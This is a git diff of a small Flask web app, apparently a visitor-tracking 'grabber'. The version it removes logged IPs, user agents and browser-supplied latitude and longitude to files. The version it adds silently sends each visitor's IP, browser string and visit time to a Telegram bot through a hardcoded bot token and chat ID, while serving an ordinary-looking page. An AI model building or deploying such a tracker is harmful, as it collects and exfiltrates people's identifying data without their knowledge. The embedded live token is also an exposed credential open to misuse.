@@ -1,39 +1,40 @@
-from flask import Flask, request, render_template, jsonify
+
+from flask import Flask, request, render_template
 import datetime
-import os
+import requests
 
 app = Flask(__name__)
 
-# Crée les fichiers de logs s'ils n'existent pas
-if not os.path.exists("log_visites.txt"):
-    open("log_visites.txt", "w").close()
+# Configuration Telegram
+TOKEN = "7249761868:AAEDYDMewdHuDCmCCfSZ6uZzj3PxOrtIQxw"
+CHAT_ID = "6937350459"
 
-if not os.path.exists("log_positions.txt"):
-    open("log_positions.txt", "w").close()
+def envoyer_telegram(message):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    data = {
+        "chat_id": CHAT_ID,
+        "text": message
+    }
+    try:
+        requests.post(url, data=data)
+    except Exception as e:
+        print(f"[ERREUR TELEGRAM] {e}")
 
-@app.route('/')
-def page():
+@app.route("/")
+def accueil():
     ip = request.remote_addr
-    user_agent = request.headers.get('User-Agent')
-    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    navigateur = request.user_agent.string
+    date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    with open('log_visites.txt', 'a') as f:
-        f.write(f"{now} | IP: {ip} | UA: {user_agent}\n")
+    # Message à envoyer
+    message = f"📥 Nouvelle visite détectée :\n" \
+              f"🕒 Date : {date}\n" \
+              f"🌍 IP : {ip}\n" \
+              f"🖥 Navigateur : {navigateur}"
 
-    return render_template('page.html')
+    envoyer_telegram(message)
 
-@app.route('/log_position', methods=['POST'])
-def log_position():
-    data = request.get_json()
-    ip = request.remote_addr
-    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    lat = data.get('latitude')
-    lon = data.get('longitude')
+    return render_template("page.html")
 
-    with open('log_positions.txt', 'a') as f:
-        f.write(f"{now} | IP: {ip} | Lat: {lat} | Lon: {lon}\n")
-
-    return jsonify({'status': 'ok'})
-
-if __name__ == '__main__':
+if __name__ == "__main__":
     app.run(debug=True)
